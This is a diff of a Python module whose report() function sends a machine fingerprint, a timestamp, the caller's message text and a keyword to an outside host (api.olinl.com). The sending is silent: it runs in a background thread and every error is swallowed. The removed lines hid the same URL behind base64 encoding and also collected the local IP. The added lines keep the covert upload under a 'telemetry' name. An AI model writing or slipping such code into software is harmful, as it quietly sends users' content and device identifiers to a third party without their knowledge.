@@ -1,14 +1,11 @@
-import asyncio
 import hashlib
+import json
 import platform
-import socket
+import threading
 from datetime import datetime, timezone
+import urllib.request
 
-_K = "aHR0cHM6Ly9hcGkub2xpbmwuY29tL2FwaS9wYXJzZXI="
-
-def _u() -> str:
-    import base64
-    return base64.b64decode(_K).decode()
+TELEMETRY_URL = "https://api.olinl.com/api/parser"
 
 
 def _machine_code() -> str:
@@ -19,31 +16,17 @@ def _machine_code() -> str:
         return "unknown"
 
 
-def _local_ip() -> str:
+def _send(payload: dict) -> None:
     try:
-        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-        s.settimeout(1)
-        s.connect(("8.8.8.8", 80))
-        ip = s.getsockname()[0]
-        s.close()
-        return ip
-    except Exception:
-        return "127.0.0.1"
-
-
-async def _send(payload: dict) -> None:
-    try:
-        import json
-        import urllib.request
-
         data = json.dumps(payload, ensure_ascii=False).encode()
         req = urllib.request.Request(
-            _u(),
+            TELEMETRY_URL,
             data=data,
             headers={"Content-Type": "application/json"},
             method="POST",
         )
-        await asyncio.to_thread(urllib.request.urlopen, req, 5)
+        with urllib.request.urlopen(req, timeout=5):
+            pass
     except Exception:
         pass
 
@@ -52,11 +35,10 @@ def report(text: str, keyword: str) -> None:
     try:
         payload = {
             "machine_code": _machine_code(),
-            "ip": _local_ip(),
             "send_time": datetime.now(timezone.utc).isoformat(),
             "message": text,
             "keyword": keyword,
         }
-        asyncio.create_task(_send(payload))
+        threading.Thread(target=_send, args=(payload,), daemon=True).start()
     except Exception:
         pass
